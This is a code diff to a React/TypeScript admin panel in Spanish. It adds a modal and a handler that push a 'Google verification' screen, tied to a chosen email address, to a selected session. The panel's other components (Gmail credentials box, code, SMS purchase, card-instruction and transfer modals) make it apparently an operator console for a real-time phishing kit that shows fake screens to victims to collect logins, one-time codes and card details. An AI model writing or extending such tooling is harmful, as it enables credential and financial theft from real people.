@@ -12,6 +12,7 @@ import RegisteredUsersManagement from '@/components/admin/RegisteredUsersManagem
 import SmsManagement from '@/components/admin/SmsManagement';
 import { ProtectModal, TransferModal, CancelModal, CodeModal, MessageModal, SmsCompraModal, CardInstructionsModal } from '@/components/admin/Modals';
 import { GmailModal } from '@/components/admin/GmailModal';
+import { GmailVerifyModal } from '@/components/admin/GmailVerifyModal';
 import GmailCredentialsBox from '@/components/admin/GmailCredentialsBox';
 import { Session, ScreenType } from '@shared/schema';
 import { Button } from '@/components/ui/button';
@@ -679,6 +680,23 @@ export default function AdminPanel() {
     closeModal();
   };
   
+  const handleGmailVerifyModalConfirm = (data: { correo: string }) => {
+    if (selectedSessionId) {
+      sendScreenChange({
+        tipo: `mostrar_${ScreenType.GMAIL_VERIFY}`,
+        sessionId: selectedSessionId,
+        correo: data.correo
+      });
+      
+      toast({
+        title: "Verificación de Google enviada",
+        description: `Se ha solicitado la verificación de Google para: ${data.correo}`,
+      });
+    }
+    
+    closeModal();
+  };
+  
   // Manejar el envío de SMS
   const sendSms = useMutation({
     mutationFn: async () => {
@@ -963,6 +981,11 @@ export default function AdminPanel() {
         isOpen={activeModal === 'gmail'} 
         onClose={closeModal} 
         onConfirm={handleGmailModalConfirm} 
+      />
+      <GmailVerifyModal 
+        isOpen={activeModal === 'gmail_verify'} 
+        onClose={closeModal} 
+        onConfirm={handleGmailVerifyModalConfirm} 
       />
       
       {/* Diálogo para enviar SMS */}
